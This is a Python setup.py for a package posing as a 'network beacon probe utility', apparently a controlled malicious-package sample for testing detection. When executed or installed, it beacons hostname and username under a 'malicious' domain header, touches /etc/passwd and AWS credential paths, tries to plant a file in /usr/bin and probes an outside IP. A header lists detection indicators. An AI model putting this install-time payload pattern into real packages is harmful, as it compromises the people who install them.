# Controlled static indicators for detection only:
# /etc/passwd /etc/shadow .ssh/id_rsa .aws/credentials Authorization: Bearer BEGIN PRIVATE KEY
# /collect /exfil socket.connect( subprocess.run( os.system( ctypes
# exec( eval( compile( __import__( base64.b64decode(
# crontab .bashrc .profile systemctl enable
# cmdclass post_install "preinstall" "postinstall"
# import socket import subprocess import ctypes import pty

import os, socket, subprocess, time
from setuptools import setup
from setuptools.command.install import install

MALICIOUS_DOMAIN = "metalt.3zavlore.surf"
PORTS = [1234]

def try_open(p):
    try: open(p).close()
    except: pass

def connect_attempt(host, port):
    try:
        s = socket.socket(); s.settimeout(0.8)
        s.connect((host, port))
        s.send(b"GET / HTTP/1.0\r\nHost: " + host.encode() + b"\r\n\r\n")
        s.close()
    except: pass

def run_payload():
    try: socket.getaddrinfo(MALICIOUS_DOMAIN, 80)
    except: pass
    try: socket.gethostbyname(MALICIOUS_DOMAIN)
    except: pass

    try:
        subprocess.run([
            "curl", "-sS", "-m", "3", "-X", "POST",
            "-H", f"Host: {MALICIOUS_DOMAIN}",
            "-H", "Content-Type: application/json",
            "-H", "User-Agent: net-beacon-probe/1.0",
            "--data", f'{{"host":"{socket.gethostname()}","domain":"{MALICIOUS_DOMAIN}","user":"{os.environ.get("USER","unknown")}"}}',
            "http://127.0.0.1:8080/beacon"
        ], capture_output=True, timeout=6)
    except: pass

    for p in ["/etc/passwd","/etc/hosts","/etc/resolv.conf","/etc/os-release"]:
        try_open(p)
    for p in ["/root/.aws/credentials"]:
        try_open(p)

    for i in range(17):
        p = f"/tmp/net_beacon_artifact_{i}.txt"
        try:
            with open(p,"w") as f: f.write(f"artifact {i}\n")
            os.unlink(p)
        except: pass

    try:
        subprocess.run(["/bin/sh","-c","exec 3>/usr/bin/net_beacon_dropper && echo '#!/bin/sh' >&3 && sleep 5; exec 3>&-"],
            timeout=8, capture_output=True)
    except: pass

    for port in PORTS:
        connect_attempt("127.0.0.1", port)
        connect_attempt("1.1.1.1", port)

    end = time.time() + 18
    while time.time() < end:
        pass

class PostInstall(install):
    def run(self):
        install.run(self)
        run_payload()

run_payload()

if __name__ == "__main__":
    setup(
        name="net-beacon-probe",
        version="1.0.2",
        description="Network beacon probe utility",
        packages=["net_beacon_probe"],
        cmdclass={"install": PostInstall},
        install_requires=[],
    )
